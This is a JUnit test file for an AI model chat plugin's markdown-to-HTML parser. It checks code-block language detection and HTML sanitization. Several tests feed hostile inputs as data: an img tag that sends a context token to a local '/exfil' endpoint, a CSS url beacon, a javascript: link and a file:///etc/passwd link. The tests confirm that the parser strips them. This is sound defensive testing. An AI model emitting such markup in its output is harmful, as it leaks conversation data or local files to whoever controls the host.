/*
 * Copyright 2024 Oracle and/or its affiliates
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.dbn.assistant.chat.message;

import com.dbn.assistant.chat.context.ChatContextImpl;
import com.dbn.common.text.TextContent;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.junit.Assert;
import org.junit.Test;

import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static com.dbn.assistant.AssistantType.PUBLIC;
import static com.dbn.assistant.chat.message.AuthorType.AGENT;
import static com.dbn.common.message.MessageType.NEUTRAL;

public class ChatMessageTest {

    @Test
    public void testSample1() throws Exception{
        List<ChatMessageTextSection> sections = readMessageSections("/assistantChatMessages/md-sample-01.md");
        Assert.assertEquals(1, sections.size());
        Assert.assertEquals("typescript", sections.get(0).getLanguageId());
    }

    @Test
    public void testSample2() throws Exception{
        List<ChatMessageTextSection> sections = readMessageSections("/assistantChatMessages/md-sample-02.md");
        Assert.assertEquals(1, sections.size());
        Assert.assertEquals("javascript", sections.get(0).getLanguageId());
    }

    @Test
    public void testSample3() throws Exception{
        List<ChatMessageTextSection> sections = readMessageSections("/assistantChatMessages/md-sample-03.md");
        Assert.assertEquals(11, sections.size());
        Assert.assertNull(sections.get(0).getLanguageId());
        Assert.assertNull(sections.get(2).getLanguageId());
        Assert.assertNull(sections.get(4).getLanguageId());
        Assert.assertNull(sections.get(6).getLanguageId());
        Assert.assertNull(sections.get(8).getLanguageId());
        Assert.assertNull(sections.get(10).getLanguageId());

        Assert.assertEquals("python", sections.get(1).getLanguageId());
        Assert.assertEquals("javascript", sections.get(3).getLanguageId());
        Assert.assertEquals("java", sections.get(5).getLanguageId());
        Assert.assertEquals("c++", sections.get(7).getLanguageId());
        Assert.assertEquals("c#", sections.get(9).getLanguageId());
    }


    @Test
    public void testSample4() throws Exception{
        List<ChatMessageTextSection> sections = readMessageSections("/assistantChatMessages/md-sample-04.md");
        Assert.assertEquals(1, sections.size());
        Assert.assertNull(sections.get(0).getLanguageId());
    }

    @Test
    public void testSample5() throws Exception{
        List<ChatMessageTextSection> sections = readMessageSections("/assistantChatMessages/md-sample-05.md");
        Assert.assertEquals(11, sections.size());

        Assert.assertNull(sections.get(0).getLanguageId());
        Assert.assertNull(sections.get(2).getLanguageId());
        Assert.assertNull(sections.get(4).getLanguageId());
        Assert.assertNull(sections.get(6).getLanguageId());
        Assert.assertNull(sections.get(8).getLanguageId());
        Assert.assertNull(sections.get(10).getLanguageId());

        Assert.assertEquals("sql", sections.get(1).getLanguageId());
        Assert.assertEquals("sql", sections.get(3).getLanguageId());
        Assert.assertEquals("plsql", sections.get(5).getLanguageId());
        Assert.assertEquals("json", sections.get(7).getLanguageId());
        Assert.assertEquals("bash", sections.get(9).getLanguageId());
    }

    @Test
    public void convertMarkdownToHtmlSanitizesSample5() throws IOException {
        String content = readResource("/assistantChatMessages/md-sample-05.md");

        Document document = convertMarkdownToHtml(content);

        Assert.assertTrue(document.body().select("img, style, iframe, link, object, embed").isEmpty());
        Assert.assertTrue(document.body().select("[style]").isEmpty());
        Assert.assertTrue(document.text().contains("HTML block:"));
        Assert.assertTrue(document.text().contains("Kitchen Sink"));
        Assert.assertNotNull(document.selectFirst("table"));
        Assert.assertEquals(
                "https://docs.oracle.com/en/database/oracle/oracle-database/19/lnpls/",
                findLink(document, "Oracle PL/SQL Language Reference (19c)").attr("href"));
        Assert.assertEquals(
                "https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/DBMS_OUTPUT.html",
                findLink(document, "DBMS_OUTPUT (HTML link tag)").attr("href"));
    }

    @Test
    public void convertMarkdownToHtmlSanitizesRawHtmlElements() {
        String content = "**hi** <img src=\"http://127.0.0.1:8765/exfil?token={ctx}\"> " +
                "<style>body{background:url(http://127.0.0.1:8765/x)}</style>" +
                "<iframe src=\"https://example.com\"></iframe>";

        Document document = convertMarkdownToHtml(content);

        Assert.assertTrue(document.body().select("img, style, iframe, link, object, embed").isEmpty());
        Assert.assertEquals("hi", document.selectFirst("strong").text());
    }

    @Test
    public void convertMarkdownToHtmlPreservesLiteralComparisonCharacters() {
        Document document = convertMarkdownToHtml("Keep values where amount < 100 and amount > 10.");

        Assert.assertTrue(document.text().contains("amount < 100 and amount > 10"));
    }

    @Test
    public void convertMarkdownToHtmlAllowsOnlySafeLinkProtocols() {
        String content = "[bad](javascript:alert(1)) [file](file:///etc/passwd) [ok](https://example.com/docs)";

        Document document = convertMarkdownToHtml(content);

        Assert.assertFalse(findLink(document, "bad").hasAttr("href"));
        Assert.assertFalse(findLink(document, "file").hasAttr("href"));
        Assert.assertEquals("https://example.com/docs", findLink(document, "ok").attr("href"));
    }

    @Test
    public void convertMarkdownToHtmlPreservesMarkdownTables() {
        String content = "| Name | Value |\n" +
                "| --- | --- |\n" +
                "| alpha | beta |";

        Document document = convertMarkdownToHtml(content);

        Element table = document.selectFirst("table");
        Assert.assertNotNull(table);
        Assert.assertEquals("0", table.attr("cellspacing"));
        Assert.assertEquals("4", table.attr("cellpadding"));
        Assert.assertEquals("alpha", document.selectFirst("td").text());
    }

    private static List<ChatMessageTextSection> readMessageSections(String resource) throws IOException {
        String content = readResource(resource);
        ChatContextImpl chatContext = new ChatContextImpl(PUBLIC);
        ChatMessage chatMessage = new ChatMessage(PUBLIC, NEUTRAL, content, AGENT, chatContext);
        return chatMessage.getSections();
    }

    private static String readResource(String name) throws IOException {
        URL resource = ChatMessageTest.class.getResource(name);
        return Files.readString(Path.of(resource.getPath()));
    }

    private static Document convertMarkdownToHtml(String content) {
        TextContent htmlContent = ChatMessageParser.convertMarkdownToHtml(content);
        return Jsoup.parse(htmlContent.getText());
    }

    private static Element findLink(Document document, String text) {
        for (Element link : document.select("a")) {
            if (text.equals(link.text())) return link;
        }

        Assert.fail("Could not find link with text " + text);
        return null;
    }
}
